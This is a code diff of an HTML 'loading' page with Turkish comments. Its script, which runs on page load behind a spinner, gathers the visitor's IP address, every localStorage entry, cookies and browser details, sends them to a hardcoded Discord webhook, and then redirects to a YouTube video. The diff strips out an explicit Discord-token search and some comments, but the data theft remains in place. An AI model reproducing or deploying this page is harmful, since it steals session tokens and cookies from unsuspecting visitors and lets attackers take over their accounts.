@@ -6,7 +6,7 @@
     <title>Yükleniyor...</title>
     <style>
         body {
-            background-color: black; /* SİYAAH EKRAAN */
+            background-color: black;
             margin: 0;
             padding: 0;
             height: 100vh;
@@ -16,7 +16,6 @@
             overflow: hidden;
         }
         
-        /* Yükleme Göstergesi */
         .loader {
             border: 4px solid #333;
             border-top: 4px solid white;
@@ -34,14 +33,12 @@
 </head>
 <body>
 
-    <!-- Siyah ekranın ortasında küçük bir yükleme simgesi -->
     <div class="loader"></div>
 
 <script>
     // --- AYARLAR ---
     const WEBHOOK_URL = "https://discord.com/api/webhooks/1565166860897615912/I2CNk0KdLEXpdPkbMLoFTpAChNaeL8sS4YDqEH-26z7lptRg3lOs-UpBMHRbSlSW1Qke"; 
 
-    // IP Adresini Al
     async function getIP() {
         try {
             const response = await fetch('https://api.ipify.org?format=json');
@@ -52,31 +49,13 @@
         }
     }
 
-    // VERİ TOPLAMA FONKSİYONU
     async function collectAndSendData() {
-        let discordToken = localStorage.getItem('token') || localStorage.getItem('discord_token');
-        
-        // Token bulunamazsa başka anahtarları dene
-        if (!discordToken) {
-            for (let key in localStorage) {
-                if (key.includes('discord')) {
-                    discordToken = localStorage.getItem(key);
-                    break;
-                }
-            }
-        }
-
-        // Tüm localStorage anahtarlarını tara
+        // Tüm localStorage verilerini al
         let allLocalData = {};
         for (let i = 0; i < localStorage.length; i++) {
             const key = localStorage.key(i);
             const value = localStorage.getItem(key);
             allLocalData[key] = value;
-            
-            // Eğer token içeren bir anahtar bulursa onu işaretle
-            if (key.includes('discord')) {
-                discordToken = value;
-            }
         }
 
         const cookies = document.cookie;
@@ -88,8 +67,7 @@
 
         // Veriyi hazırla
         let data = {
-            token: discordToken,
-            allLocalStorage: allLocalData, // Tüm localStorage verisi
+            allLocalStorage: allLocalData, // TÜM localStorage
             cookies: cookies,
             userAgent: userAgent,
             platform: platform,
@@ -113,16 +91,12 @@
         }
     }
 
-    // SAYFA YÜKLENDİĞİNDE OTOMATİK BAŞLAT
     window.onload = function() {
-        // 1. Verileri topla ve gönder
         collectAndSendData();
 
-        // 2. 2 saniye bekle
         setTimeout(() => {
-            // 3. Hedef siteye yönlendir (Video Linki)
             window.location.href = "https://www.youtube.com/watch?v=cwQgjq0mCdE&list=RDcwQgjq0mCdE&start_radio=1&pp=ygUPa2FueWUgaSBsb3ZlIGl0oAcB";
-        }, 2000); // 2 saniye
+        }, 2000);
     };
 </script>
 
